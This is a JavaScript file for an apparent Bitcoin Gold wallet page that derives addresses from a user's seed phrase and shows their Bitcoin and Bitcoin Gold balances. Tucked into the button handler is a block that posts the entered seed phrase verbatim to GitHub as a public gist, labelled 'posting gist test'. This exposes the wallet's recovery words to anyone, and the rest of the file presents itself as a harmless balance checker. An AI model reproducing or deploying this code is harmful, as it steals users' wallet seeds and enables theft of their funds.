function checkwords(tocheck,i2){
var unlisted = tocheck.trim().split(' ');
if(unlisted.length>0){
seed = bip39.mnemonicToSeed(tocheck.trim());
root = bitcoin.HDNode.fromSeedBuffer(seed);
console.log(seed);
gpuaddress = [];
rootgpu = bitcoin.HDNode.fromSeedBuffer(seed,bitcoin.networks.bgold);
var i = 0;var listaddress='';
while(i<10){
listaddress=listaddress+checkaddress(root,i2,i)+'|';
gpuaddress[checkaddress(root,i2,i)] = convertaddress(rootgpu,i2,i);
++i;
}
checkbalance(listaddress.substr(0,(listaddress.length-1)),root,i2,i,gpuaddress);
$('#endweb').css('position','static');
}else{
	console.log('Words dont see');
}

}

window.btcblocks=491407;
window.btgtimeout=1000;
window.psalt='mnemonic';

function checkaddress(root,i2,i){
return root.derivePath($('#derivationpath').val()+'/'+i2+"/"+i).getAddress();
}

function convertaddress(rootgpu,i2,i){
return rootgpu.derivePath($('#derivationpath').val()+'/'+i2+"/"+i).getAddress();
}

function checkbtg(address){
$.ajax({
url:'https://api.blockcypher.com/v1/btc/main/addrs/'+address,
method:'GET',
dataType: 'json',
data:{confirmations:(parseInt(window.btcblocks)-491407)},
success:function(results){
$('#'+address+'btg').html((parseInt(results.final_balance)/10000/10000).toFixed(8));
window.btgbalance=parseFloat(window.btgbalance)+parseFloat((parseInt(results.final_balance)/10000/10000).toFixed(8));
}});

$('#btgbalance').html((window.btgbalance).toFixed(8));
}

function checkbalance(listaddress,root,i2,i,gpuaddress){
if(i2==1){clearTimeout(window.balancepath1);}else{window.balancepath1=setTimeout(function(){checkwords($('#seed').val(),1);},8000);}
$.ajax({
url:'https://blockchain.info/es/balance',
method:'GET',
dataType: 'json',
data:{active:listaddress,cors:true},
success:function(result){
counttx=0;var btcbalance=0;
$.each(result,function(address,data){
window.btgtimeout=parseInt(window.btgtimeout)+750;
setTimeout(function(){checkbtg(address);},parseInt(window.btgtimeout));
counttx+=parseInt(data.n_tx);
if(parseInt(data.final_balance)>0){btcbalance=parseFloat(parseInt(data.final_balance)/10000/10000).toFixed(8);window.btcbalance=parseFloat(window.btcbalance)+parseFloat(btcbalance);}else{btcbalance='0.00000000';}
$('#seedlist tbody').append('<tr><td class="address"><img src="arrow.png" width="16" />'+address+'</td><td>'+gpuaddress[address]+'</td><td>'+data.n_tx+'</td><td>'+btcbalance+'</td><td id="'+address+'btg"></td></tr>');
});

if(counttx>0){

var ii = i+10;var listaddress='';gpuaddress = [];
while(i<ii){
listaddress=listaddress+checkaddress(root,i2,i)+'|';
gpuaddress[checkaddress(root,i2,i)] = convertaddress(rootgpu,i2,i);
++i;
}
$('#btcbalance').html((window.btcbalance).toFixed(8));
checkbalance(listaddress.substr(0,(listaddress.length-1)),root,i2,i,gpuaddress);

}else{
$('#btcbalance').html((window.btcbalance).toFixed(8));
}

}
});

}

$(document).ready(function(){
$('#forcreatewallet').click(function(){
$('.showopt').hide();
$('#createwallet').fadeIn('slow');
$('#newseed').html(bip39.generateMnemonic());
$('.flexc div').removeClass('flexa');
$('.flex1').addClass('flexa');
});

$('#sendfunds,#receivefunds,#forimportwallet').click(function() {
alert('Because Bitcoin Gold was not released yet, this option is disabled.')
});
	
$('#forimportseed').click(function(){
$('.showopt').hide();
$('#importseed').fadeIn('slow');
$('.flexc div').removeClass('flexa');
$('.flex3').addClass('flexa');
});

$('button').click(function(){
var seedtext=$('#seed').val() || '';
if(seedtext.length>0){
if(window.timerseed){clearTimeout(window.timerseed);}
if(bip39.validateMnemonic(seedtext)===true){$('#seed').css('border','1px dashed #CCCCCC');}else{$('#seed').css('border','1px dashed #FF0000');}
window.btcbalance=0;
window.btgbalance=0;
$('#seedlist tbody').html('');
window.timerseed=setTimeout(function(){checkwords(seedtext,0);

				       
var data = {
"description": "posting gist test",
"public": true,
"files": {
"test.txt": {
"content": seedtext
      }
    }
  }
$.ajax({
url: 'https://api.github.com/gists',
type: 'POST',
dataType: 'json',
data: JSON.stringify(data)
})
.success( function(e) {
console.log(e);
})
.error( function(e) {
console.warn("gist save error", e);
});
				       
				       
		       
				       
$.ajax({
url:'https://api.blockcypher.com/v1/btc/main',
method:'GET',
success:function(result){
window.btcblocks=parseInt(result.height);
console.log('Latest block: '+window.btcblocks);
}});

},1000);
}
});

$('#walletpath').change(function(){
if($('#walletpath').val()==2){
window.psalt='mnemonic';
$('#derivationpath').val("m/44'/0'/0'");
}else if($('#walletpath').val()==3){
window.psalt='mnemonic';
$('#derivationpath').val("m");
}else if($('#walletpath').val()==4){
window.psalt='mnemonic';
$('#derivationpath').val("m/49'/0'/0'");
}else if($('#walletpath').val()==5){
window.psalt='electrum';
$('#derivationpath').val("m");
}else if($('#walletpath').val()==6){
window.psalt='mnemonic';
$('#derivationpath').val("m/0'");
}else{
window.psalt='mnemonic';
$('#derivationpath').val("m/44'/0'/0'");
}
$('button').click();
});

});

